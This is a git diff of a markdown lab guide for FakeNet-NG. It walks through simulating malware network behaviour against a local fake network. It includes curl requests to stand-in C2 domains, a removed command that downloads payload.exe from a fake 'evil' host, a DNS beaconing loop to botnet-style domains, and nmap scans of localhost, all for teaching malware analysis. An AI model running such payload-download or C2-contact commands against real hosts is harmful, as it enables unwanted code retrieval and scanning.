@@ -47,37 +47,35 @@ Leave this terminal window open. This is your **“Deception / Analyst” view**
 
 Open a **second terminal**.
 
-### 3.1 List listening ports
-
-```bash
-sudo netstat -tulnp | grep -i fakenet
-```
-
-If `netstat` is missing, use:
+### List listening ports
 
 ```bash
 sudo ss -tulnp | grep -i fakenet
 ```
 
+<img width="979" height="250" alt="image" src="https://github.com/user-attachments/assets/6fbfb6fc-8cda-48fb-9e82-f1bb80680697" />
+
+
 You should see FakeNet-NG listening on multiple ports, for example:
-- 53 (DNS)
-- 80 (HTTP)
-- 443 (HTTPS/SSL)
-- 21 (FTP)
-- 25 (SMTP)
+- 53 (**DNS**)
+- 80 (**HTTP**)
+- 443 (**HTTPS/SSL**)
+- 21 (**FTP**)
+- 25 (**SMTP**)
 - Others depending on your version/config
 
 > This is the **deception**: FakeNet-NG pretends to be many services at once,
-> so “malware” thinks it is talking to the real Internet.
+> so “**malware**” thinks it is talking to the real **Internet**
 
 ---
 
-## 4. Simulate simple web “malware” traffic
+## Simulate simple web “malware” traffic
 
-FakeNet-NG is still running in **terminal 1**.  
-In **terminal 2**, we’ll play the role of the “malware” sending traffic.
+- FakeNet-NG is still running in **terminal 1**.  
 
-### 4.1 HTTP request to a domain
+- In **terminal 2**, we’ll play the role of the “malware” sending traffic.
+
+### HTTP request to a domain
 
 ```bash
 curl http://totally-not-evil-c2.com/
@@ -89,66 +87,27 @@ Watch **terminal 1** (FakeNet-NG window):
 - Then an HTTP request logged by FakeNet-NG
 - FakeNet-NG will return some default HTML content
 
-In **terminal 2**, you’ll see that HTML response from FakeNet-NG, not the real Internet.
+<img width="938" height="40" alt="image" src="https://github.com/user-attachments/assets/5312dd38-41f0-45c7-9893-ca29679db31d" />
 
-### 4.2 HTTPS request (FakeNet as fake TLS server)
+### HTTPS request (FakeNet as fake TLS server)
 
 ```bash
 curl https://really-bad-c2.example/ -k
 ```
 
-- The `-k` flag tells `curl` to ignore certificate issues.
-- FakeNet-NG pretends to be the HTTPS server and answers the request.
-
-Again, watch **terminal 1** to see the intercepted traffic and listener output.
+<img width="938" height="40" alt="image" src="https://github.com/user-attachments/assets/5abfe875-eb52-46a4-b483-3dc85026129e" />
 
 ---
 
-## 5. Simulate a “malware” downloader
-
-Many samples download payloads like `evil.exe` from some HTTP server.  
-Let’s simulate that with `curl`.
-
-Still in **terminal 2**:
-
-```bash
-curl -o payload.exe http://malicious-update.evil/payload.exe
-```
-
-- FakeNet-NG sees a request for a `.exe` file
-- It responds with a **default fake PE file** from its `defaultFiles` directory
-- To the “malware”, this looks like a real executable download succeeded
-
-Check what we downloaded:
-
-```bash
-file payload.exe
-ls -lh payload.exe
-```
-
-You should see that `payload.exe` is a valid file (often a small PE) even though
-it came from your **fake** network.
-
-> This is classic **deception**: the attacker / malware thinks the download worked
-> and continues execution, while you safely observe everything.
-
----
-
-## 6. Simulate DNS beaconing
+## Simulate DNS beaconing
 
 Let’s imitate beaconing behavior where malware repeatedly talks to random domains.
-
-First install DNS tools if needed:
-
-```bash
-sudo apt install -y dnsutils
-```
 
 Now run:
 
 ```bash
 for i in {1..5}; do
-  dig +short c2$i.super-evil-botnet.com
+  dig @127.0.0.1 +short c2$i.super-evil-botnet.com
   sleep 1
 done
 ```
@@ -158,31 +117,36 @@ Watch **terminal 1**:
 - You should see multiple DNS queries for the fake `c2*.super-evil-botnet.com` domains
 - FakeNet-NG will respond with fake IP addresses
 
+<img width="916" height="62" alt="image" src="https://github.com/user-attachments/assets/69ef8600-3069-4cd3-b62c-73148f0fa186" />
+
 > In a real analysis, these logs help you extract **network IOCs**
 > (domains, IPs, URIs) from malware safely.
 
 ---
 
-## 7. Simulate a port-scanning “malware”
+## Simulate a port-scanning “malware”
 
 Now we’ll pretend the malware is scanning common service ports.
 
-### 7.1 Install nmap (if not installed)
+### Scan common ports on localhost
 
 ```bash
-sudo apt install -y nmap
-```
-
-### 7.2 Scan common ports on localhost
-
-```bash
-nmap -Pn -p 21,25,53,80,110,443,445 127.0.0.1
+nmap -Pn -p 211,25,53,8086,1337,443,110 127.0.0.1
 ```
 
 - From **nmap’s perspective** (attacker view), it will look like these ports are open
   and responding on `127.0.0.1`.
+
+>[!Note]
+> When FakeNet is active on Linux, SYN scans (-sS) often show ports as filtered.
+> This happens because FakeNet intercepts packets using iptables/NFQUEUE.
+> To correctly observe open ports, use a TCP connect scan:
+
 - In **terminal 1** (FakeNet-NG), you’ll see many connection attempts logged
   against the emulated services.
+
+<img width="503" height="144" alt="image" src="https://github.com/user-attachments/assets/bb612132-ceb7-42ed-9953-d62a6c937ab6" />
+
 
 You can push it further with a more aggressive scan (optional, but noisy):
 
@@ -190,12 +154,11 @@ You can push it further with a more aggressive scan (optional, but noisy):
 nmap -sS -p- 127.0.0.1
 ```
 
-FakeNet-NG will try to keep up and emulate responses, again acting as a fake,
-but convincing, network.
+FakeNet-NG will try to keep up and emulate responses, again acting as a fake, but convincing, network.
 
 ---
 
-## 8. Look at captures / logs
+## Look at captures / logs
 
 Stop FakeNet-NG by going to **terminal 1** and pressing:
 
@@ -203,10 +166,9 @@ Stop FakeNet-NG by going to **terminal 1** and pressing:
 Ctrl + C
 ```
 
-Depending on version/config, FakeNet-NG may:
+Depending on version/config, FakeNet-NG will:
 
 - Save a **PCAP** file with captured traffic
-- Or create a `fakenet_logs` directory with logs and captures
 
 In the directory where you started FakeNet-NG, run:
 
@@ -214,48 +176,13 @@ In the directory where you started FakeNet-NG, run:
 ls
 ```
 
-Look for files such as:
-
-- `*.pcap`
-- `fakenet_logs/`
-- Or similar log filenames
+Look for `*.pcap` files
 
 If you see a `.pcap` file, you can open it with Wireshark later for deeper analysis:
 
 ```bash
 wireshark captured_traffic.pcap
 ```
-
-(You don’t need Wireshark for this lab, but it’s a nice extension.)
-
----
-
-## 9. Quick recap (what this lab demonstrated)
-
-In this lab you:
-
-- Installed **FakeNet-NG** on Linux
-- Observed how it:
-  - Took over multiple ports (DNS, HTTP, HTTPS, FTP, SMTP, etc.)
-  - Answered requests with **fake but valid** responses
-- Simulated “malware-like” behavior:
-  - Reaching out to fake C2 domains
-  - Downloading a fake payload executable
-  - Beaconing via DNS
-  - Scanning ports on localhost
-- Saw both perspectives:
-  - **Attacker / Malware view** (commands you ran)
-  - **Defender / Analyst view** (FakeNet-NG logs and captures)
-
-This is a simple but concrete example of **network deception** in action:
-FakeNet-NG tricks untrusted software into talking to your controlled fake
-services, letting you safely observe everything it tries to do.
-
-
-
-
-
-
 
 
 ***                                                                 
